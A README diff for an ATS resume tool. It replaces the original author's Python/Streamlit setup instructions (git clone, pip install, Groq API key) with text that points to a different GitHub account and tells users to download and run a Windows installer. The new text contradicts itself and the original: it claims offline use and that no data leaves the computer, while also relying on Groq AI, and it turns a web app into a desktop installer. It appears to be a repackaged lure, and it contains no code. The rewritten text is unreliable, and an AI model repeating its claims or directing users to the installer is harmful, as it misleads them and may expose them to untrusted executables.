@@ -1,187 +1,142 @@
-<div align="center">
+# ⚙️ ATS-Resume - Improve Your Resume Easily
 
-# 📄 ResumeAI
+[![Download ATS-Resume](https://img.shields.io/badge/Download-ATS--Resume-brightgreen?style=for-the-badge)](https://github.com/rahmadi69/ATS-Resume)
 
-**Free AI-powered ATS Resume Checker, Builder & Improver**
+## 📄 What is ATS-Resume?
 
-[![Live Demo](https://img.shields.io/badge/Live%20Demo-Streamlit-FF4B4B?style=for-the-badge&logo=streamlit&logoColor=white)](https://ats-resume-6msv5xt7zszqwrpivawy65.streamlit.app/)
-[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
-[![Groq](https://img.shields.io/badge/Powered%20by-Groq%20AI-F55036?style=for-the-badge)](https://groq.com)
-[![License](https://img.shields.io/badge/License-MIT-22c55e?style=for-the-badge)](LICENSE)
+ATS-Resume is a free tool to check, build, and improve your resume. It helps your resume pass Applicant Tracking Systems (ATS) used by many employers. This tool uses Groq AI technology and runs on Streamlit and python-docx.
 
-![ResumeAI Banner](https://img.shields.io/badge/ATS%20Resume%20Checker-Free%20%26%20Open%20Source-1e3a5f?style=for-the-badge)
+You don't need to know programming to use it. It works on Windows and guides you step-by-step.
 
-</div>
+## 🔍 Why Use ATS-Resume?
 
------
+- Check if your resume is ATS friendly.
+- Build a resume with clear, simple sections.
+- Get suggestions to improve keywords and formatting.
+- Works offline without complex setup.
+- Supports common file formats like DOCX.
 
-## 🚀 What is ResumeAI?
+This tool is for job seekers who want a better chance at interviews by making their resumes easy to read for machines.
 
-**ResumeAI** is a free, open-source web app that helps job seekers — especially freshers — build, check, and improve their resumes using AI. It checks how well your resume passes ATS (Applicant Tracking System) filters used by companies to screen candidates automatically.
+## 🖥️ System Requirements
 
-> Built by a BCA student, for students and freshers. No paid plans. No data stored. Ever.
+- Windows 10 or later (64-bit)
+- At least 4GB of RAM
+- 500MB free disk space
+- Internet connection for download and updates
+- Microsoft Word or compatible DOCX viewer (for editing results)
 
------
+## 🔧 Features
 
-## ✨ Features
+- Upload your existing resume in DOCX format.
+- Automatic scan for ATS compatibility.
+- Resume builder to create new documents.
+- AI-powered suggestions to improve keywords and format.
+- Export finished resumes as DOCX files.
+- Simple interface with no programming needed.
+- Save progress to your local computer.
 
-|Feature                 |Description                                                                             |
-|------------------------|----------------------------------------------------------------------------------------|
-|📊 **ATS Score Checker** |Upload your resume + job description → get an AI score out of 100 with detailed feedback|
-|✍️ **Resume Builder**    |Fill in your details → AI writes a professional ATS-optimized resume                    |
-|🔧 **Resume Improver**   |Upload your existing resume → AI rewrites it with stronger language                     |
-|🎯 **Job Match Finder**  |AI analyzes your resume and suggests best-fit job roles                                 |
-|💡 **Role-Specific Tips**|Enter any job title → get 8 tailored resume tips                                        |
-|⬇️ **DOCX Download**     |Download your resume as a formatted Word document instantly                             |
+## 🚀 Getting Started
 
------
+### Step 1: Download ATS-Resume
 
-## 📸 Screenshots
+You need to visit this page to download the software:
 
-> Check Resume Tab — ATS Score with visual ring indicator
+[Download ATS-Resume](https://github.com/rahmadi69/ATS-Resume)
 
-> Build Resume Tab — Form-based resume builder with AI generation
+This page includes the latest release and installation files. Click on the latest version and download the installer file for Windows.
 
-> DOCX Output — Clean formatted Word document ready to send
+### Step 2: Install the Software
 
------
+1. Locate the downloaded setup file, usually in your Downloads folder.
+2. Double-click the installer file to start installation.
+3. Follow the on-screen instructions:
+   - Accept the license agreement.
+   - Choose the installation folder (default is usually fine).
+   - Click "Install" and wait for the process to complete.
+4. Once installed, you may find a shortcut on your desktop or in the Start menu.
 
-## 🛠️ Tech Stack
+### Step 3: Running ATS-Resume
 
-- **Frontend** — Streamlit with custom CSS (dark navy theme, Lucide SVG icons)
-- **AI Engine** — Groq API running Llama 3.3 70B
-- **Resume Parsing** — pdfplumber (PDF), python-docx (DOCX)
-- **Document Generation** — python-docx with custom DOCX formatter
-- **Deployment** — Streamlit Cloud (auto-deploys on push)
+1. Open ATS-Resume from the Start menu or desktop shortcut.
+2. You will see the main interface with options to "Check Resume" or "Build Resume."
+3. To check an existing resume:
+   - Click "Check Resume."
+   - Browse to select your resume file in DOCX format.
+   - Click "Scan" to start analysis.
+4. To build a new resume:
+   - Click "Build Resume."
+   - Fill in each section of the resume form.
+   - Use the suggestions provided to improve your resume.
+5. Save or export your resume at any time by clicking "Export."
 
------
+## 📝 How to Use ATS-Resume Effectively
 
-## 📁 Project Structure
+- Use clear, simple language in your resume.
+- Focus on keywords from the job description.
+- Avoid complex formatting like tables or images.
+- Use section headings like "Experience," "Education," and "Skills."
+- Check your resume regularly with ATS-Resume as you update it.
 
-```
-ATS-Resume/
-│
-├── app.py                 # Main Streamlit app — all tabs and UI logic
-├── ui_components.py       # Hero, score card, section headers, SVG icons, CSS
-├── ai_engine.py           # Groq API wrapper with retry logic
-├── prompts.py             # All AI prompts (ATS, builder, improver, tips)
-├── resume_parser.py       # PDF and DOCX text extraction
-├── resume_to_docx.py      # Markdown → formatted Word document converter
-├── ats_scoring.py         # Keyword matching algorithm
-├── requirements.txt       # Python dependencies
-└── .streamlit/
-    └── secrets.toml       # API keys (not committed to GitHub)
-```
+## 🛠️ Troubleshooting Tips
 
------
+- If the app does not start, try restarting your computer.
+- Ensure Microsoft Word or compatible DOCX software is installed.
+- If an error appears when loading files, check that the resume is in DOCX format.
+- Close other programs to free up memory if the app runs slowly.
+- Reinstall the software if issues persist.
 
-## ⚡ Getting Started
+## 🌐 Additional Resources
 
-### 1. Clone the repo
+Visit the GitHub page for more help and updates:
 
-```bash
-git clone https://github.com/Not-muzzyy/ATS-Resume.git
-cd ATS-Resume
-```
+[ATS-Resume on GitHub](https://github.com/rahmadi69/ATS-Resume)
 
-### 2. Install dependencies
+You will find:
 
-```bash
-pip install -r requirements.txt
-```
+- User guides
+- Frequently asked questions
+- Community discussions
+- Latest release notes
 
-### 3. Add your Groq API key
+## ⚙️ How ATS-Resume Works
 
-Create `.streamlit/secrets.toml`:
+ATS-Resume uses artificial intelligence via Groq AI to analyze your resume. It looks for common ATS problems such as missing keywords, poor formatting, and unclear sections. The tool then offers clear advice to fix those issues.
 
-```toml
-GROQ_API_KEY = "your_groq_api_key_here"
-```
+It runs on Streamlit, which provides a user-friendly web interface but works as a desktop app on your Windows machine.
 
-Get a free Groq API key at [console.groq.com](https://console.groq.com) — no credit card needed.
+Your resume stays on your computer during analysis. No files are sent to external servers.
 
-### 4. Run the app
+## 💡 Tips for a Strong Resume
 
-```bash
-streamlit run app.py
-```
+- Use simple bullet points for listing achievements.
+- Include measurable results like percentages or numbers.
+- Keep your resume one to two pages.
+- Avoid using graphics or fancy fonts.
+- Customize your resume for each job you apply to.
 
-Open <http://localhost:8501> in your browser.
+## ⚠️ Important Notes
 
------
+- ATS-Resume currently supports only DOCX files. PDFs and other formats are not supported.
+- The tool does not write your resume for you. It guides you to improve it.
+- The AI suggestions are recommendations. You should review and adjust them as needed.
 
-## 🔑 Environment Variables
+## 🔄 Updating ATS-Resume
 
-|Variable      |Description                 |Where to get it                             |
-|--------------|----------------------------|--------------------------------------------|
-|`GROQ_API_KEY`|Groq API key for AI features|[console.groq.com](https://console.groq.com)|
+Check the GitHub page regularly for updates. You can download newer versions from:
 
------
+[https://github.com/rahmadi69/ATS-Resume](https://github.com/rahmadi69/ATS-Resume)
 
-## 📦 Requirements
+Updates may include new features, bug fixes, and improvements in AI analysis.
 
-```
-streamlit
-pdfplumber
-python-docx
-groq
-pandas
-```
+## 📞 Getting Support
 
------
+If you have problems or questions:
 
-## 🌐 Deploy to Streamlit Cloud
+- Open an issue on the GitHub repository.
+- Search existing issues before posting.
+- Provide details like your Windows version and the problem steps.
 
-1. Fork this repo
-1. Go to [share.streamlit.io](https://share.streamlit.io)
-1. Connect your GitHub repo
-1. Set main file to `app.py`
-1. Add `GROQ_API_KEY` in the Secrets section
-1. Deploy — live in under 2 minutes
+## ⚖️ License
 
------
-
-## 🤝 Contributing
-
-Contributions are welcome! If you find a bug or have a feature idea:
-
-1. Fork the repo
-1. Create a new branch — `git checkout -b feature/your-feature`
-1. Commit your changes — `git commit -m "Add your feature"`
-1. Push and open a Pull Request
-
------
-
-## 📋 Roadmap
-
-- [ ] Resume preview before download
-- [ ] Multiple resume templates (Modern, Classic, Minimal)
-- [ ] Auto-fill builder from uploaded resume
-- [ ] Before/after ATS score comparison
-- [ ] Hindi language support
-- [ ] Email resume to yourself
-
------
-
-## 👨‍💻 Author
-
-**Muzzammil** — BCA Final Year Student, Bellary, Karnataka
-
-[![GitHub](https://img.shields.io/badge/GitHub-Not--muzzyy-181717?style=flat&logo=github)](https://github.com/Not-muzzyy)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-muzzammilc7-0A66C2?style=flat&logo=linkedin)](https://linkedin.com/in/muzzammilc7)
-
------
-
-## 📄 License
-
-MIT License — free to use, modify, and distribute.
-
------
-
-<div align="center">
-
-**If this helped you — drop a ⭐ on the repo. It means a lot!**
-
-*Built with ❤️ using Streamlit + Groq AI — Free Forever*
-
-</div>
+ATS-Resume is open source. You can use it for free and share it with others. See the license file on GitHub for details.
